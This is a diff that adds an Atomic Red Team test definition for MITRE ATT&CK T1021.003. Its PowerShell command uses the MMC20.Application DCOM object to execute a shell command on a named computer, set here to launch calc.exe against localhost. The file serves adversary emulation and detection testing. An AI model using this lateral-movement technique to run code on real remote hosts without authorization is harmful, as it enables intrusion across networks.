@@ -1,0 +1,24 @@
+attack_technique: T1021.003
+display_name: 'Remote Services: Distributed Component Object Model'
+atomic_tests:
+- name: PowerShell Lateral Movement using MMC20
+  auto_generated_guid: 6dc74eb1-c9d6-4c53-b3b5-6f50ae339673
+  description: |
+    Powershell lateral movement using the mmc20 application com object.
+
+    Reference:
+
+    https://blog.cobaltstrike.com/2017/01/24/scripting-matt-nelsons-mmc20-application-lateral-movement-technique/
+
+    Upon successful execution, cmd will spawn calc.exe on a remote computer.
+  supported_platforms:
+  - windows
+  input_arguments:
+    computer_name:
+      description: Name of Computer
+      type: string
+      default: localhost
+  executor:
+    command: |
+      [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.application","#{computer_name}")).Document.ActiveView.ExecuteShellCommand("c:\windows\system32\calc.exe", $null, $null, "7")
+    name: powershell
